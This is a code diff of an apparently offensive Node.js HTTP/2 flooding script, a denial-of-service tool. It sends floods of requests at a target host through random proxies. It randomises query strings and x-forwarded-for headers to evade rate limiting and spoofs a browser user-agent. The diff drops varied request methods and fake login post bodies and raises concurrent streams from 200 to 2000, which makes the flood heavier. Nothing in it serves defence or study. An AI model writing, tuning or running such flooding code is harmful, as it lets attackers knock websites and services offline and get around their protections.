@@ -72,13 +72,6 @@ const rateHeaders = [
     { "x-forwarded-for": randstr(12) }
 ];
 
-const methods = ["GET", "POST", "OPTIONS"]; // Added multiple HTTP methods
-const postData = [
-    JSON.stringify({ [randstr(5)]: randstr(10) }),
-    `username=${randstr(8)}&password=${randstr(12)}`,
-    `query=${randstr(15)}&filter=${randstr(6)}`
-];
-
 const siga = randomElement(sig);
 const ver = randomElement(version);
 const accept = randomElement(accept_header);
@@ -142,29 +135,16 @@ class NetSocket {
 }
 
 const Socker = new NetSocket();
-
-function getHeaders(method) {
-    const headers = {
-        ":method": method,
-        ":authority": parsedTarget.host,
-        ":path": parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
-        ":scheme": "https",
-        "sec-ch-ua": ver,
-        "sec-ch-ua-platform": "Windows",
-        "accept-encoding": encoding,
-        "accept-language": lang,
-        "accept": accept,
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
-    };
-    
-    // Add additional headers for POST requests
-    if (method === "POST") {
-        headers["content-type"] = randomElement(["application/json", "application/x-www-form-urlencoded", "text/plain"]);
-        headers["content-length"] = Buffer.byteLength(randomElement(postData)).toString();
-    }
-    
-    return headers;
-}
+headers[":method"] = "GET";
+headers[":authority"] = parsedTarget.host;
+headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
+headers[":scheme"] = "https";
+headers["sec-ch-ua"] = ver;
+headers["sec-ch-ua-platform"] = "Windows";
+headers["accept-encoding"] = encoding;
+headers["accept-language"] = lang;
+headers["accept"] = accept;
+headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
@@ -214,7 +194,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 200,
+                maxConcurrentStreams: 2000,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536,
                 enablePush: false
@@ -224,19 +204,12 @@ function runFlooder() {
 
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
-                const method = randomElement(methods);
                 const dynHeaders = {
-                    ...getHeaders(method),
+                    ...headers,
                     ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
                 };
-                
                 for (let i = 0; i < args.Rate; i++) {
                     const request = client.request(dynHeaders);
-                    
-                    if (method === "POST") {
-                        request.write(randomElement(postData));
-                    }
-                    
                     request.on("response", () => {
                         request.close();
                         request.destroy();
